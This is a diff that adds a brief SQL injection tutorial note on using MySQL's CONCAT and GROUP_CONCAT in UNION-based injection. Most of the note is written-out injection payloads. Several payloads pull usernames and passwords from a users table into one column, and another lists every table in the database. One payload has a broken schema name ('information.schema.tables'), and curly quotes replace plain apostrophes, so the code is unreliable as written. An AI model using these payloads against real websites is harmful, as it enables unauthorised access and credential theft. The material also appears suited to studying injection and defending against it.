@@ -1,0 +1,23 @@
+Concat Function:
+SQL CONCAT function is used to concatenate two strings to form a single string within a single row. So while extracting usernames and passwords, generally you do something like this (Assuming column 3 is showing the output):
+
+For usernames:
+id=1’ UNION SELECT 1,2,username,4 from users--+
+
+For passwords:
+id=1’ UNION SELECT 1,2,password,4 from users--+
+
+But with concat(), you can get both in a single column like this:
+id=1’ UNION SELECT 1,2,concat(username,password),4 from users--+
+
+Note that there will be no space in between them but you can add a dash with this:
+id=1’ UNION SELECT 1,2,concat(username,’ - ’,password),4 from users--+
+
+
+
+GROUP_CONCAT:
+The GROUP_CONCAT() function in MySQL is used to concatenate data from multiple rows into one field.
+
+Example query:-
+union select 1,group_concat(table_name),3,4 from information.schema.tables--+
+Here in above query we are trying to fetch all tables present in the database in a single query. This is very helpful when a website is only giving one table at a time but we want to extract all tables
